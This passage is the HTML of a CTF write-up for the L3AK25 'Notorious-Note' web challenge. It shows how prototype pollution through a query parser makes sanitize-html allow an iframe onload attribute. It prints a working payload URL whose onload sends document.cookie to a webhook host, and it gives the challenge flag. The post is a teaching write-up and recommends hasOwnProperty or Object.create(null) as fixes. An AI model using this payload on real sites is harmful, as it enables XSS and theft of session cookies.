</span></span><span class=line><span class=cl>    <span class=nx>allowedAttributes</span><span class=o>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>a</span><span class=o>:</span> <span class=p>[</span><span class=s2>&#34;href&#34;</span><span class=p>,</span> <span class=s2>&#34;name&#34;</span><span class=p>,</span> <span class=s2>&#34;target&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=nx>img</span><span class=o>:</span> <span class=p>[</span><span class=s2>&#34;src&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=nx>selfClosing</span><span class=o>:</span> <span class=p>[</span><span class=s2>&#34;img&#34;</span><span class=p>,</span> <span class=s2>&#34;br&#34;</span><span class=p>,</span> <span class=s2>&#34;hr&#34;</span><span class=p>,</span> <span class=s2>&#34;area&#34;</span><span class=p>,</span> <span class=s2>&#34;base&#34;</span><span class=p>,</span> <span class=s2>&#34;basefont&#34;</span><span class=p>,</span> <span class=s2>&#34;input&#34;</span><span class=p>,</span> <span class=s2>&#34;link&#34;</span><span class=p>,</span> <span class=s2>&#34;meta&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nx>allowedSchemes</span><span class=o>:</span> <span class=p>[</span><span class=s2>&#34;http&#34;</span><span class=p>,</span> <span class=s2>&#34;https&#34;</span><span class=p>,</span> <span class=s2>&#34;ftp&#34;</span><span class=p>,</span> <span class=s2>&#34;mailto&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nx>allowedSchemesByTag</span><span class=o>:</span> <span class=p>{},</span>
</span></span><span class=line><span class=cl>    <span class=nx>allowedSchemesAppliedToAttributes</span><span class=o>:</span> <span class=p>[</span><span class=s2>&#34;href&#34;</span><span class=p>,</span> <span class=s2>&#34;src&#34;</span><span class=p>,</span> <span class=s2>&#34;cite&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nx>allowProtocolRelative</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>enforceHtmlBoundary</span><span class=o>:</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><p>Few things stand out:</p><ul><li><code>&lt;iframe></code> is allowed (this is often a bad sign).</li><li>Only specific attributes are permitted (<code>href</code>, <code>src</code>, etc.), and they&rsquo;re tightly scoped.</li></ul><p>But here’s the thing, if we can sneak in an unexpected attribute like <code>onload</code>, especially on an iframe, it’s game over. Time to trace how <code>allowedAttributes</code> is processed internally.</p><blockquote><p>Special thanks to <a href=https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/>Securitum Research</a> for uncovering such use for prototype pollution with HTML sanitizers</p></blockquote><h3 id=finding-the-sink>Finding the Sink<a hidden class=anchor aria-hidden=true href=#finding-the-sink>#</a></h3><p>The first place we find it being used is during config setup:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>options</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>options</span> <span class=o>=</span> <span class=nx>sanitizeHtml</span><span class=p>.</span><span class=nx>defaults</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>options</span><span class=p>.</span><span class=nx>parser</span> <span class=o>=</span> <span class=nx>htmlParserDefaults</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Then, shortly after:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>allowedAttributes</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>allowedAttributesMap</span> <span class=o>=</span> <span class=p>{};</span>
</span></span><span class=line><span class=cl>    <span class=nx>allowedAttributesGlobMap</span> <span class=o>=</span> <span class=p>{};</span>
</span></span><span class=line><span class=cl>    <span class=nx>each</span><span class=p>(</span><span class=nx>options</span><span class=p>.</span><span class=nx>allowedAttributes</span><span class=p>,</span> <span class=kd>function</span><span class=p>(</span><span class=nx>attributes</span><span class=p>,</span> <span class=nx>tag</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>allowedAttributesMap</span><span class=p>[</span><span class=nx>tag</span><span class=p>]</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>globRegex</span> <span class=o>=</span> <span class=p>[];</span>
</span></span><span class=line><span class=cl>        <span class=nx>attributes</span><span class=p>.</span><span class=nx>forEach</span><span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>obj</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>isString</span><span class=p>(</span><span class=nx>obj</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>obj</span><span class=p>.</span><span class=nx>indexOf</span><span class=p>(</span><span class=s2>&#34;*&#34;</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>globRegex</span><span class=p>.</span><span class=nx>push</span><span class=p>(</span><span class=nx>quoteRegexp</span><span class=p>(</span><span class=nx>obj</span><span class=p>).</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/\\\*/g</span><span class=p>,</span> <span class=s2>&#34;.*&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>allowedAttributesMap</span><span class=p>[</span><span class=nx>tag</span><span class=p>].</span><span class=nx>push</span><span class=p>(</span><span class=nx>obj</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=nx>allowedAttributesGlobMap</span><span class=p>[</span><span class=nx>tag</span><span class=p>]</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>RegExp</span><span class=p>(</span><span class=s2>&#34;^(&#34;</span> <span class=o>+</span> <span class=nx>globRegex</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=s2>&#34;|&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=s2>&#34;)$&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Here, the user-supplied <code>allowedAttributes</code> is broken down into two internal objects:</p><ul><li><code>allowedAttributesMap</code>: direct attribute whitelists (e.g. <code>{ img: ["src"] }</code>)</li><li><code>allowedAttributesGlobMap</code>: regex-based wildcards (e.g. <code>{ '*': /^(data-.*)$/ }</code>)</li></ul><p>What matters is how these maps are <strong>checked</strong> later on:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=o>!</span><span class=nx>allowedAttributesMap</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=nx>has</span><span class=p>(</span><span class=nx>allowedAttributesMap</span><span class=p>,</span> <span class=nx>name</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>allowedAttributesMap</span><span class=p>[</span><span class=nx>name</span><span class=p>].</span><span class=nx>indexOf</span><span class=p>(</span><span class=nx>a</span><span class=p>)</span> <span class=o>!==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=nx>allowedAttributesMap</span><span class=p>[</span><span class=s2>&#34;*&#34;</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=nx>allowedAttributesMap</span><span class=p>[</span><span class=s2>&#34;*&#34;</span><span class=p>].</span><span class=nx>indexOf</span><span class=p>(</span><span class=nx>a</span><span class=p>)</span> <span class=o>!==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=nx>has</span><span class=p>(</span><span class=nx>allowedAttributesGlobMap</span><span class=p>,</span> <span class=nx>name</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>allowedAttributesGlobMap</span><span class=p>[</span><span class=nx>name</span><span class=p>].</span><span class=nx>test</span><span class=p>(</span><span class=nx>a</span><span class=p>))</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>    <span class=p>(</span><span class=nx>allowedAttributesGlobMap</span><span class=p>[</span><span class=s2>&#34;*&#34;</span><span class=p>]</span> <span class=o>&amp;&amp;</span> <span class=nx>allowedAttributesGlobMap</span><span class=p>[</span><span class=s2>&#34;*&#34;</span><span class=p>].</span><span class=nx>test</span><span class=p>(</span><span class=nx>a</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>passedAllowedAttributesMapCheck</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Bingo~</p><ul><li><code>allowedAttributesMap["*"]</code> is read without any <code>hasOwnProperty()</code> checks.</li><li>If we poison <code>Object.prototype["*"]</code>, the sanitizer will read it — and treat whatever array we give it as a legitimate attribute whitelist.</li><li>That means: if we can make <code>["onload"]</code> appear at <code>allowedAttributesMap["*"]</code>, then <strong>any tag</strong>, including <code>&lt;iframe></code>, can now carry an <code>onload</code>.</li></ul><blockquote><p><code>hasOwnProperty</code> would&rsquo;ve mitigated the risk by only checking the direct properties and not climbing the prototype chain</p></blockquote><h3 id=the-final-payload>The Final Payload<a hidden class=anchor aria-hidden=true href=#the-final-payload>#</a></h3><p>So, putting it all together:</p><ol><li>We craft a query string that results in <code>__proto__["*"] = ["onload"]</code>.</li><li>We add a sanitized tag (<code>&lt;iframe></code>) with an <code>onload</code> that exfiltrates cookies.</li><li>The recursive parser in <code>Query.js</code> writes into <code>__proto__</code>.</li><li><code>sanitize-html</code> sees <code>allowedAttributesMap["*"] = ["onload"]</code> and happily allows it.</li></ol><p>Here&rsquo;s the final payload:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://127.0.0.1:5000/?__proto__<span class=o>[</span>*<span class=o>]=[</span><span class=s1>&#39;onload&#39;</span><span class=o>]</span><span class=p>&amp;</span><span class=nv>note</span><span class=o>=</span>&lt;iframe <span class=nv>onload</span><span class=o>=</span><span class=s2>&#34;fetch(&#39;https://webhook?c=&#39;+document.cookie)&#34;</span>&gt;&lt;/iframe&gt;
</span></span></code></pre></div><p>And just like that, XSS is achieved.</p><p><img alt=Primeagen loading=lazy src=https://media1.tenor.com/m/hYU0XdvEzmAAAAAC/theprimeagen-primeagen.gif></p><p>Flag is: <code>L3AK{v1b3_c0d1n9_w3nt_t00_d33p_4nd_3nd3d_1n_xss}</code></p><h2 id=conclusions>Conclusions<a hidden class=anchor aria-hidden=true href=#conclusions>#</a></h2><ul><li>The application trusted query parameters and used a recursive parser (<code>Query.js</code>) that allowed us to set arbitrary nested object keys, including special ones like <code>__proto__</code>.</li><li>The sanitizer (<code>sanitize-html</code>) applied configuration settings without protecting against inherited properties from <code>Object.prototype</code>.</li><li>By setting <code>__proto__[*]=["onload"]</code>, we polluted <code>allowedAttributesMap["*"]</code> to allow <code>onload</code> globally.</li><li>Since <code>&lt;iframe></code> was an allowed tag, this enabled a clean <code>&lt;iframe onload=...></code> XSS payload.</li><li>This is a classic case of <strong>prototype pollution leading to XSS</strong> in a context where object configs are used without <code>hasOwnProperty()</code> or <code>Object.create(null)</code>.</li></ul><h2 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h2><ol><li><a href=https://tc39.es/ecma262/#sec-ordinary-and-exotic-objects-behaviours>ECMAScript: Ordinary and Exotic Objects Behaviours (Section 10.1)</a></li><li><a href=https://tc39.es/ecma262/#sec-inherited-property>ECMAScript: Inherited Property Lookup (Section 9.1.8)</a></li><li><a href=https://tc39.es/ecma262/#sec-ordinarygetprototypeof>ECMAScript: <code>[[GetPrototypeOf]]</code> Internal Method</a></li><li><a href=https://tc39.es/ecma262/#sec-object-type>ECMAScript: Object Type Definition (Section 6.1.7)</a></li><li><a href=https://www.npmjs.com/package/sanitize-html><code>sanitize-html</code> on npm</a></li><li><a href=https://github.com/apostrophecms/sanitize-html>ApostropheCMS: <code>sanitize-html</code> GitHub Repository</a></li><li><a href=https://best-of-web.builder.io/library/apostrophecms/sanitize-html>Builder.io: Library summary of <code>sanitize-html</code></a></li><li><a href=https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#proof-of-concept-2>DOMPurify Bypass Research (Mizu)</a></li><li><a href=https://xclow3n.github.io/security/santize-html.html>sanitize-html Prototype Pollution & XSS — xclow3n</a></li><li><a href=https://github.com/fb55/htmlparser2><code>htmlparser2</code> GitHub Repository</a></li><li><a href=https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/>Securitum Research: Prototype Pollution & HTML Sanitizers</a></li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hxuu.github.io/blog/tags/ctf/>Ctf</a></li><li><a href=https://hxuu.github.io/blog/tags/write-up/>Write-Up</a></li><li><a href=https://hxuu.github.io/blog/tags/l3ak/>L3ak</a></li></ul><nav class=paginav><a class=prev href=https://hxuu.github.io/blog/ctf/l3ak25/window-of-opportunity/><span class=title>« Prev</span><br><span>L3AK25: Writeup for Web/Window_of_Opportunity</span>
</a><a class=next href=https://hxuu.github.io/blog/ctf/l3ak25/flag-l3ak/><span class=title>Next »</span><br><span>L3AK25: Writeup for Web/Flag-L3ak</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Notorious-Note on x" href="https://x.com/intent/tweet/?text=L3AK25%3a%20Writeup%20for%20Web%2fNotorious-Note&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fnotorious-note%2f&amp;hashtags=ctf%2cwrite-up%2cl3ak"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Notorious-Note on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fnotorious-note%2f&amp;title=L3AK25%3a%20Writeup%20for%20Web%2fNotorious-Note&amp;summary=L3AK25%3a%20Writeup%20for%20Web%2fNotorious-Note&amp;source=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fnotorious-note%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Notorious-Note on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fnotorious-note%2f&title=L3AK25%3a%20Writeup%20for%20Web%2fNotorious-Note"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Notorious-Note on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fnotorious-note%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Notorious-Note on whatsapp" href="https://api.whatsapp.com/send?text=L3AK25%3a%20Writeup%20for%20Web%2fNotorious-Note%20-%20https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fnotorious-note%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Notorious-Note on telegram" href="https://telegram.me/share/url?text=L3AK25%3a%20Writeup%20for%20Web%2fNotorious-Note&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fnotorious-note%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share L3AK25: Writeup for Web/Notorious-Note on ycombinator" href="https://news.ycombinator.com/submitlink?t=L3AK25%3a%20Writeup%20for%20Web%2fNotorious-Note&u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fl3ak25%2fnotorious-note%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hxuu.github.io/blog/>hxuu</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>